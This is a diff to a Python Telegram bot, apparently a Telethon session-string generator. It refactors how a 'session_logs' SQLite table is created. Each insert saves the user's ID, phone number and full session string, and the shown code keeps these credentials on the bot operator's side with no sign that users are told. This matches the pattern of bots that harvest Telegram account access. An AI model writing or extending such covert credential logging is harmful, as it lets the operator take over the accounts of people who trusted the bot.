@@ -24,6 +24,22 @@ user_sessions = {}
 def get_db_connection():
     return sqlite3.connect('session_data.db', timeout=10.0)  # Timeout after 10 seconds
 
+# 🔹 Ensure session_logs table is created
+def create_session_table():
+    db_connection = get_db_connection()
+    cursor = db_connection.cursor()
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS session_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER NOT NULL,
+        phone TEXT NOT NULL,
+        session_string TEXT NOT NULL,
+        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+    ''')
+    db_connection.commit()
+    db_connection.close()
+
 # ✅ /start Command
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
@@ -104,9 +120,9 @@ async def process_input(event):
                 session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
             # Log the session string to the database with timeout
+            create_session_table()  # Ensure table exists before inserting
             db_connection = get_db_connection()
             cursor = db_connection.cursor()
-            cursor.execute("CREATE TABLE IF NOT EXISTS session_logs (id INTEGER PRIMARY KEY, user_id INTEGER, phone TEXT, session_string TEXT)")
             cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
                            (user_id, phone_number, session_string))
             db_connection.commit()
@@ -143,6 +159,7 @@ async def process_input(event):
                 session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
             # Log the session string to the database with timeout
+            create_session_table()  # Ensure table exists before inserting
             db_connection = get_db_connection()
             cursor = db_connection.cursor()
             cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
